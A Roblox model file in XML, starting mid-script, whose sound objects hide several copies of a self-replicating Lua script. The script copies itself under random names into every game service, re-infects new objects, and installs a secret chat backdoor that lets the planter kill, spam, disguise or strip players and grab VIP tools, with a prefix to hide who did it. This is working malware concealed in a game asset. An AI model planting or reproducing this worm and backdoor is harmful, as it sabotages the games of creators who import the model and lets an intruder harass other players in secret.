if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="Part" referent="RBX14">
				<Properties>
					<bool name="Anchored">false</bool>
					<float name="BackParamA">-0.5</float>
					<float name="BackParamB">0.5</float>
					<token name="BackSurface">0</token>
					<token name="BackSurfaceInput">0</token>
					<float name="BottomParamA">-0.5</float>
					<float name="BottomParamB">0.5</float>
					<token name="BottomSurface">0</token>
					<token name="BottomSurfaceInput">0</token>
					<int name="BrickColor">199</int>
					<CoordinateFrame name="CFrame">
						<X>-13.0000153</X>
						<Y>2.40077853</Y>
						<Z>-23.0000153</Z>
						<R00>0.99999994</R00>
						<R01>0.000328811555</R01>
						<R02>-1.82298863e-005</R02>
						<R10>-0.000328811468</R10>
						<R11>0.99999994</R11>
						<R12>3.21281209e-006</R12>
						<R20>1.82309414e-005</R20>
						<R21>-3.20681647e-006</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<bool name="CanCollide">true</bool>
					<bool name="DraggingV1">false</bool>
					<float name="Elasticity">0.5</float>
					<token name="FormFactor">0</token>
					<float name="Friction">1</float>
					<float name="FrontParamA">-0.5</float>
					<float name="FrontParamB">0.5</float>
					<token name="FrontSurface">0</token>
					<token name="FrontSurfaceInput">0</token>
					<float name="LeftParamA">-0.5</float>
					<float name="LeftParamB">0.5</float>
					<token name="LeftSurface">0</token>
					<token name="LeftSurfaceInput">0</token>
					<bool name="Locked">false</bool>
					<token name="Material">256</token>
					<string name="Name">Left Rear</string>
					<float name="Reflectance">0</float>
					<float name="RightParamA">0.300000012</float>
					<float name="RightParamB">0.300000012</float>
					<token name="RightSurface">6</token>
					<token name="RightSurfaceInput">1</token>
					<Vector3 name="RotVelocity">
						<X>-0.00144175836</X>
						<Y>-0.0142638413</Y>
						<Z>0.00533132255</Z>
					</Vector3>
					<float name="TopParamA">-0.5</float>
					<float name="TopParamB">0.5</float>
					<token name="TopSurface">0</token>
					<token name="TopSurfaceInput">0</token>
					<float name="Transparency">0</float>
					<Vector3 name="Velocity">
						<X>0.0692308396</X>
						<Y>-0.000502244977</Y>
						<Z>0.00727567542</Z>
					</Vector3>
					<bool name="archivable">true</bool>
					<token name="shape">2</token>
					<Vector3 name="size">
						<X>4</X>
						<Y>4</Y>
						<Z>4</Z>
					</Vector3>
				</Properties>
				<Item class="StockSound" referent="RBX15">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">281hws43</string>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX16">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">ywo59tjv</string>
							<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="StockSound" referent="RBX17">
				<Properties>
					<bool name="Looped">false</bool>
					<string name="Name">111wbbtz</string>
					<int name="PlayCount">-1</int>
					<bool name="PlayOnRemove">false</bool>
					<Content name="SoundId"><null></null></Content>
					<float name="Volume">0.5</float>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX18">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">k0lm</string>
						<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
